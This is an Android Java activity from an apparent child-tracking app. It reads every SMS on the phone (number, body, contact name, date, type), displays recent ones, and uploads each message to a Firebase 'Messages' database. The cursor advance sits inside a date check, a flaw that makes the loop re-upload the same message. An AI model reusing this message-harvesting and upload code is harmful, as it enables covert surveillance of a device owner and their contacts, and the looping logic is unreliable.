package com.appdev.debsourav.childtracker;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.Telephony;
import android.support.v7.app.AppCompatActivity;
import android.widget.TextView;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.GregorianCalendar;

public class MessageHistory extends AppCompatActivity {

    TextView txtMsgs;
    DatabaseReference msgRef;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_msg_history);
        txtMsgs= findViewById(R.id.txtMsgs);
        msgRef= FirebaseDatabase.getInstance().getReference("Messages");

        String messagelog = getAllSms(getApplicationContext());
        txtMsgs.setText(messagelog);

    }

    public String getAllSms(Context context) {

        StringBuffer stringBuffer = new StringBuffer();
        ContentResolver cr = context.getContentResolver();
        Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        int totalSMS = 0;

        if (c != null) {
            totalSMS = c.getCount();
            if (c.moveToFirst()) {
                for (int j = 0; j < totalSMS; j++) {
                    String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    String name = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.PERSON));
                    Date dateFormat = new Date(Long.valueOf(smsDate));
                    String type = "";
                    Calendar today = Calendar.getInstance();
                    today.clear(Calendar.HOUR);
                    today.clear(Calendar.MINUTE);
                    today.clear(Calendar.SECOND);
                    Date todayDate = today.getTime();
                    Date dateRange = addDays(todayDate, -7);

                    switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                        case Telephony.Sms.MESSAGE_TYPE_INBOX:
                            type = "inbox";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_SENT:
                            type = "sent";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                            type = "outbox";
                            break;
                        default:
                            break;
                    }

                    if (!(dateFormat.before(dateRange))) {
                        stringBuffer.append("\nNumber:---" + number +
                                " \nBody:--- "
                                + body + "\nName:--- " + name + " \nDate:--- " + dateFormat
                                + " \nMessage Type :--- " + type);
                        stringBuffer.append("\n\n");
                        c.moveToNext();
                    }

                    Message msg= new Message(number, body, name, ""+dateFormat, type);
                    msgRef.child(""+dateFormat).setValue(msg);


                }
            } else {
                Toast.makeText(this, "No message to show!", Toast.LENGTH_SHORT).show();
            }

        }
        return stringBuffer.toString();
    }

    public static Date addDays(Date date, int days) {
        GregorianCalendar cal = new GregorianCalendar();
        cal.setTime(date);
        cal.add(Calendar.DATE, days);

        return cal.getTime();
    }
}
